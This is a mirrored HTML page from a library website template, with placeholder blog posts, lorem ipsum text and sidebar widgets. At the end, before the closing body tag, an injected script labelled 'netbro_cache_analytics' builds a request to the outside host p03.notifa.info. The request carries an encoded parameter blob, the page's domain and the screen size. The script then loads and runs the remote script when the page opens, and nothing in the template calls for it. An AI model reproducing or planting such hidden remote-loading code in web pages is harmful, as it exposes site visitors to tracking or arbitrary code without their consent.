...
<!-- Mirrored from kodeforest.net/html/books/library/blog-full.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:13:06 GMT -->
<head>
<meta charset="utf-8">
    	...
    	<div class="container">
            <div class="row">
                <!--LEFT CONTENT START--> 
                 <div class="col-md-9">
                    <!--BLOG LIST START-->
                     <div class="lib-blog-2">
                        <!--BLOG THUMB START-->
                         <div class="kode-thumb">
                             <a href="#"><img src="images/style2-blog.png" alt=""></a>
                         ...
                         <!--BLOG TEXT START-->
                         <div class="kode-text">
                             <h3>Purchase Books Online From Library </h3>
                             <div class="kode-meta">
                                 <ul>
                                     <li><a href="#"><i class="fa fa-tag"></i>John Doe</a></li>
                                     <li><a href="#"><i class="fa fa-comments"></i>89 Comments</a></li>
                                 </ul>
                             </div>
                             <p>Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.Excepteur sint occaecat cupidatat non proident, sunt in culpa qui.</p>
                             <a href="#" class="more">read more <i class="fa fa-angle-right"></i></a>
                         </div>
                         <!--BLOG TEXT END-->
                     </div>
                     <!--BLOG LIST END-->
                     ...
                     <div class="lib-blog-2">
                        <!--BLOG THUMB START-->
                         <div class="kode-thumb">
                             <a href="#"><img src="images/style2-blog2.png" alt=""></a>
                             <div class="kode-blog-date">
                                 <p>20 Jan</p>
                                 <span>2015</span>
                             </div>
                     ...
                     <div class="lib-blog-2">
                        <!--BLOG THUMB START-->
                         <div class="kode-thumb">
                             <a href="#"><img src="images/style2-blog3.png" alt=""></a>
                             <div class="kode-blog-date">
                                 <p>20 Jan</p>
                                 <span>2015</span>
                             </div>
                 ...
                 <div class="col-md-3 sidebar">
                    ...
                    <div class="widget widget-latest-post">
                        ...
                        <ul>
                            <li>
                                <div class="kode-thumb">
                                    <a href="#"><img src="images/post-avaitar.png" alt=""></a>
                                </div>
                                <div class="kode-text">
                                    <h4>Lorem ipsum dolorsit amet adipiscing </h4>
                                    <p>25 December, 2015</p>
                                </div>
                            </li>
                            <li>
                                <div class="kode-thumb">
                    ...
                    <div class="widget widget-instagram">
                        <h2>Instagram</h2>
                        <ul>
                            <li><a href="#"><img src="images/instagram1.html" alt=""></a></li>
                    ...
                    <!--ARCHIVE WIDGET END-->
                    <!--ADVERTIZMENT WIDGET START-->
                    <div class="widget widget-advertizement">
                        <h2>Advertizement</h2>
                        <div class="kode-thumb">
                            <a href="#"><img src="images/add.png" alt=""></a>
                        </div>
                    </div>
                    <!--ADVERTIZMENT WIDGET END-->
                </div>
                 <!--SIDEBAR END-->
            </div>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupW9FSvCf5ZNGziNwErJRHM6HViT6Btx1I24tkTGx8uloqZfrwml18dko6s2FD%2bhcveJldWFdDhRPYC8fnZo1vayjUB0vriCTcPHGMiabmMqFCYfp9Ty0lLgZxar53kJbELyHCLz2daN8TbDYObU8WnTSPnvAwjUmLpH0ebw4w7v3BBgwSSLll%2fTSbOJrkiERtCxp3xQiQeI5g60KYX3v3oEGm%2bSNOOXb3KPgxdf%2foGp6dzoif5vZoLTE%2ffYA9uyN7BAKy8okxnhn5LHzTGWWK3rz%2beOhc%2fwM5res6x03pWI0RLRcI5KVLfxEzCF14zIpzRa87YJQ94n8MU0y0wyncZfKOnpgTkHDoTVku9d%2bef9el%2boD5yiNm1mz65ERqzdhbw4Yohre6VOeHErduEQ2z%2fYiu3M0NmXa3BiorC9uF9hjzsdUi97RCpGvSvFWnvlo%2bJ1L0U9v7QXSK3xK6HXj0SqDj0vJMxHrnJ13z1v5BmACQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from kodeforest.net/html/books/library/blog-full.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:13:19 GMT -->
</html>